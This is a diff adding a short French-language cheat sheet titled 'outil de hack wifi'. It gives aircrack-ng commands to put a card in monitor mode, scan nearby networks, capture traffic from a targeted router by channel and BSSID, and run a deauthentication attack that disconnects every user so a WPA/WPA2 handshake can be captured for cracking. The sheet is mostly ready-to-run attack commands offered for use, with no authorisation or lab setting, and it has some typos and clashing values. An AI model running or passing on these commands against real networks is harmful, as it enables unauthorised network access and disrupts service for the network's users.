@@ -1,0 +1,39 @@
+outil de hack wifi 
+
+airmon-ng Active le mode moniteur sur ta carte Wi-Fi
+airodump-ng Capture les paquets Wi-Fi
+aireplay-ng  Envoie des paquets pour tester la sécurité du réseau
+aircack-ng  Tente de retrouver la clé WPA/WPA2 depuis un fichier de capture
+
+       dabord ......
+
+  1 Passer la carte Wi-Fi en mode moniteur 
+   sudo airmon-ng start wlan0         moniteur 
+   └─$ sudo airmon-ng stop  wlan0mon  manager                           
+
+   
+  2 Capturer le trafic Wi-Fi sa montre tout les reseau au toure 
+   sudo airodump-ng wlan0mon 
+   
+  3 
+   Explication rapide
+-c 11 → canal Wi-Fi
+--bssid → MAC du routeur ciblé
+-w capture → nom du fichier de capture
+wlan0mon → interface en mode moniteur
+   
+   sudo airodump-ng -c 00 --bssid 00:A9:42:5F:00:CC -w capture wlan0mon
+   
+   nb: une personne doit se connecter pour afficher le mtchek
+   tape cette commande elle deconnecte tout le monde du wifi 
+   
+      sudo aireplay-ng -0 10 -a 98:A9:42:5F:3A:CC wlan0mon
+   
+   
+   
+   
+   
+   
+   
+   
+   
